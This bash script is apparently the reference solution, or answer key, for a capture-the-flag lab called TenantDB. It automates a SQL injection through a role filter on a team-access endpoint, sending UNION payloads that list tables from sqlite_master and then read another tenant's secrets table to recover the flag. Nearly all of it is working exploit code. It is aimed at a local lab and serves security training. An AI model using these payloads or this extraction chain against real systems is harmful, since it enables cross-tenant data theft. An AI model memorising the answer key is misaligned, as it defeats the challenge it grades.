#!/usr/bin/env bash
# ============================================================
# TenantDB (labs20) — reference solution: SQL injection with
# cross-tenant extraction
#
# Chain: self-register (demo tenant, readonly) -> the team-access
# role filter is concatenated into the SQL for the tenant table ->
# UNION-based extraction: enumerate sqlite_schema to discover the
# other tenants' tables, then read the flag from a foreign tenant's
# secrets table. (The source finding was error-based on MSSQL; this
# build uses SQLite, so the extraction is UNION-based — the missing
# parameterization and the cross-tenant reach are identical.)
#
# Usage: ./run.sh [base-url]     (default http://localhost:8100)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8100}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering (readonly, demo tenant)" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"password\":\"test123\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: registration returned no token" >&2; exit 1; }

fetch() { curl -fsS -G "$BASE/userprofile/teamaccess/" -H "Authorization: Bearer $TOKEN" \
            --data-urlencode "status=All" --data-urlencode "role=$1"; }

echo "[*] confirming injection and enumerating the schema (tenant tables)" >&2
SCHEMA="$(fetch "x' UNION SELECT name, type FROM sqlite_master--")"
tenants="$(python3 - "$SCHEMA" <<'PY'
import re, sys
tables = re.findall(r"<td>(t_[a-z0-9_]+)</td><td>table</td>", sys.argv[1])
print("\n".join(tables))
PY
)"
[[ -n "$tenants" ]] || { echo "[-] failed: no tenant tables enumerated" >&2; exit 1; }
echo "[*] discovered tenant tables:" >&2
sed 's/^/      /' <<<"$tenants" >&2

echo "[*] extracting the foreign tenant's secrets table" >&2
flag=""
for table in $tenants; do
  [[ "$table" == *secrets* ]] || continue
  ROWS="$(fetch "x' UNION SELECT secret_name, secret_value FROM $table--")"
  flag="$(python3 - "$ROWS" <<'PY'
import re, sys
m = re.search(r"FLAG\{nusasec-[0-9a-f]{32}\}", sys.argv[1])
print(m.group(0) if m else "")
PY
)"
  [[ -n "$flag" ]] && break
done

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: no flag extracted from tenant tables" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
